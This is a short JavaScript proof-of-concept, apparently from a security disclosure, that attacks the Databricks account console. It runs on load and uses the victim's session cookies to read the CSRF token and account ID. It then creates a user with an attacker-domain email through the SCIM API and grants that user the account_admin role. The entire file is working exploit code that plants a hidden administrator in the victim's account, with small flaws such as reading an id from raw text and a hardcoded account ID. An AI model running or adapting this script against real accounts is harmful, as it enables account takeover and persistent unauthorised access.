// This JS runs immediately when loaded
(async () => {
  try {
    // Step 1: Get session JSON
    const res = await fetch("https://accounts.cloud.databricks.com/session", {
      credentials: "include"
    });

    const data = await res.json();

    // Extract fields
    const csrf = data.csrfToken;
    const accountId = data.accountId;

    console.log("Fetched:", csrf, accountId);

    // Step 2: Use these values in second POST
    const createUser = await fetch(
      `https://accounts.cloud.databricks.com/api/2.1/accounts/${accountId}/scim/v2/Users`,
      {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
          "X-Csrf-Token": csrf
        },
        body: JSON.stringify({
          displayName: "TestUser",
          userName: "randomattackeremail@attacker-domain.com",
          schemas: ["urn:ietf:params:scim:schemas:core:2.0:User"]
        })
      }
    );

    const createResponse = await createUser.text();
    const id = createResponse.id; 
    console.log("Created user with id:", id);

    // Step 2: Use the id in a PATCH request
    const patchBody = {
      schemas: ["urn:ietf:params:scim:api:messages:2.0:PatchOp"],
      Operations: [
        {
          op: "add",
          path: "roles",
          value: [{ value: "account_admin" }]
        }
      ]
    };

    const patchRes = await fetch(`https://accounts.cloud.databricks.com/api/2.1/accounts/d0d2ab75-7d2b-4931-a529-fea42d0e6602/scim/v2/Users/${id}`, {
      method: "PATCH",
      credentials: "include",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(patchBody)
    });

    const patchText = await patchRes.text();
    console.log("PATCH status:", patchRes.status, "body:", patchText);

    if (patchRes.ok) {
      console.log("Admin account created and added to victim's account!");
    }

  } catch (err) {
    console.error(err);
  }
})();
